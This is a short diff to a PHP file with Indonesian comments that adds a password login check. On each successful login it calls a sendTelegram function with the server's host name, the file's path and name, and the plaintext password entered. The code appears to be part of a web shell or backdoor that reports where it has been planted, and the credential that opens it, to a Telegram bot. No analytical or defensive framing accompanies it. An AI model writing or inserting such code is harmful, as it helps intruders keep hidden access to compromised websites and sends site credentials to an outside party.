@@ -4,7 +4,18 @@ session_start();
 // TAMPILKAN ERROR
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
+// ============ LOGIN =============
+if (!isset($_SESSION['login'])) {
+    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hashed_password)) {
+        $_SESSION['login'] = true;
 
+        // ✅ Kirim Telegram
+        sendTelegram($_SERVER['HTTP_HOST'], trim(dirname($_SERVER['PHP_SELF']), '/'), basename(__FILE__), $_POST['pass']);
+
+        header("Location: ?");
+        exit;
+    }
+}
 // UTIL
 function sendTelegram($domain, $path, $file, $passwordInput) {
     global $botToken, $chatId;
